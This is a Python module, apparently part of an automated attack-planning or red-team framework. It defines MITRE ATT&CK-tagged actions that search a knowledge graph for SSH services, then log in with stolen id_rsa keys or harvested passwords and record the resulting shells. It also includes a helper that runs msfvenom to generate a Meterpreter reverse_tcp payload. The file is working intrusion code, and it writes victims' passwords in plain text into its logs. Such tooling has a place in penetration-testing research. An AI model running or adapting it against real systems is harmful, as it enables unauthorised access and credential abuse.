from typing import Union

import paramiko

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager


def generate_msf_payload(ip, port):
    """
    Use metasploit library to create a payload.
    """
    return shell(
        "msfvenom",
        [
            "-p",
            "linux/x64/meterpreter/reverse_tcp",
            f"LHOST={ip}",
            f"LPORT={port}",
            "-f",
            "elf",
            "-o",
            "/action-state-interface/shell.elf",
        ],
        sudo=True,
    )


def get_ssh_terminal(ip: str, username: str, key_filename: str = None, password: str = None):
    """
    Use SSH credentials to establish an SSH session.
    """
    # Initialize the SSH client
    client = paramiko.SSHClient()
    # pkey = paramiko.RSAKey.from_private_key_file(key_filename)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect to the remote server
    try:
        client.connect(ip, username=username, key_filename=key_filename, password=password, look_for_keys=False)
        # Start an interactive shell session
        ssh_session = client.invoke_shell()
        return ssh_session
    except paramiko.ssh_exception.NoValidConnectionsError:
        return None


class SshLoginPubkey(Action):
    """
    Use SSH key file to establish an SSH session.
    """

    def __init__(self):
        super().__init__("SshLoginPubkey", "T1078 Valid Accounts", "TA0001 Initial Access", ["quiet", "fast"])
        self.noise = 0.1
        self.impact = 0.5

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        ip = pattern.get('asset').get('ip_address')
        user = pattern.get('user').get('username')
        user_id = pattern.get('user')._id
        file = pattern.get('file').get('filename')
        file_id = pattern.get('file')._id
        directory = pattern.get('directory').get('dirname')
        directory_id = pattern.get('directory')._id
        return [
            f"Gain access to {ip} as {user} ({user_id}) using ssh key from file {file} ({file_id}) in directory {directory} ({directory_id})"
        ]

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        get_target_patterns check to identify SSH service entities, and derive login
        credentials from directory names and id files.
        """
        asset = Entity('Asset', alias='asset')
        service = Entity('Service', alias='service', protocol='ssh')
        directory = Entity(type='Directory', alias='directory')
        file = Entity(type='File', alias='file', filename='id_rsa')
        p1 = asset.directed_path_to(directory).directed_path_to(file)
        p2 = Entity(type='User', alias='user').with_edge(Relationship('is_client', direction='r')).with_node(service)
        p3 = asset.directed_path_to(service)
        pattern = p1.combine(p2).combine(p3)
        res = kg.match(pattern).where('user.username = directory.dirname AND file.artefact_id IS NOT NULL')
        return res

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Extract credentials from the target pattern and use them to
        establish an SSH session.
        """
        asset = pattern.get('asset')
        ip_address = asset.get('ip_address')
        user = pattern.get('user')
        username = user.get('username')
        file = pattern.get('file')
        ssh_artefact_id = file.get('artefact_id')

        ssh_key_file = artefacts.get_path(ssh_artefact_id)
        try:
            channel = get_ssh_terminal(ip_address, username, ssh_key_file)
            # Capture the output
            output = ""
            while channel.recv_ready():  # Keep receiving while data is available
                output += channel.recv(1024).decode()
        except Exception as e:
            raise ActionExecutionError(e)

        sess_id = sessions.add_session(channel)
        return ActionExecutionResult(
            command=["ssh", "-i", ssh_key_file, f"{username}@{ip_address}"],
            stdout=output,
            session=sess_id,
            logs=[f"Established session ID {sess_id} on {ip_address} with {username} and key file: {ssh_key_file}"],
        )

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Update knowledge graph with newly established session.
        """
        asset = pattern.get('asset')
        user = pattern.get('user')
        username = user.get('username')
        service = pattern.get('service')
        credentials = Entity(
            'Credentials',
            alias='credentials',
            username=username,
            key_file=output.command[2],
        )

        match_pattern = asset.directed_path_to(service)
        creds_pattern = credentials.with_edge(Relationship('secured_with')).with_node(service)

        session = Entity(
            'Session',
            alias='session',
            protocol='ssh',
            username=username,
            active=True,
            id=output.session,
            executes_on=service._id,
        )

        changes: StateChangeSequence = []
        changes.append((None, "merge", session))
        changes.append((match_pattern, 'merge_if_not_match', creds_pattern))
        return changes


class SshLoginWithCredentials(Action):
    """
    Use SSH credentials to establish an SSH session.
    """

    def __init__(self):
        super().__init__("SshLoginCredentials", "T1078 Valid Accounts", "TA0001 Initial Access", ["quiet", "fast"])
        self.noise = 0.1
        self.impact = 0.5

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        ip = pattern.get('asset').get('ip_address')
        user = pattern.get('user').get('username')
        user_id = pattern.get('user')._id
        service = pattern.get('service')._id
        credentials = pattern.get('credentials')._id
        return [
            f"Gain access to {ip} as {user} ({user_id}) using credentials ({credentials}) via SSH service ({service})"
        ]

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        get_target_patterns check to identify SSH service entities, and derive login
        credentials from directory names and id files.
        """
        asset = Entity('Asset', alias='asset')
        service = Entity('Service', alias='service', protocol='ssh')
        secured_with = Relationship('secured_with', direction='l')
        credentials = Entity('Credentials', alias='credentials')
        user = Entity('User', alias='user')
        is_client = Relationship('is_client')
        pattern = (
            asset.directed_path_to(service)
            .with_edge(secured_with)
            .with_node(credentials)
            .combine(user.with_edge(is_client).with_node(service))
        )
        res = kg.match(pattern).where('user.username = credentials.username AND credentials.password IS NOT NULL')
        return res

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Extract credentials from the target pattern and use them to
        establish an SSH session.
        """
        asset = pattern.get('asset')
        ip_address = asset.get('ip_address')
        user = pattern.get('user')
        username = user.get('username')
        credentials = pattern.get('credentials')
        username = credentials.get('username')
        password = credentials.get('password')
        channel = get_ssh_terminal(ip_address, username, password=password)
        # Capture the output
        output = ""
        while channel.recv_ready():  # Keep receiving while data is available
            output += channel.recv(1024).decode()

        print("SSH session output:\n", output)

        sess_id = sessions.add_session(channel)
        return ActionExecutionResult(
            command=["sshpass", "-p", password, "ssh", f"{username}@{ip_address}"],
            stdout=output,
            session=sess_id,
            logs=[f"Established session ID {sess_id} on {ip_address} with {username} and password: {password}"],
        )

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Update knowledge graph with newly established session.
        """
        user = pattern.get('user')
        username = user.get('username')
        credentials = pattern.get('credentials')
        password = credentials.get('password')
        service = pattern.get('service')
        session = Entity(
            'Session',
            alias='session',
            protocol='ssh',
            username=username,
            password=password,
            active=True,
            id=output.session,
            executes_on=service._id,
        )
        return [(None, "merge", session)]


actions = [SshLoginPubkey(), SshLoginWithCredentials()]
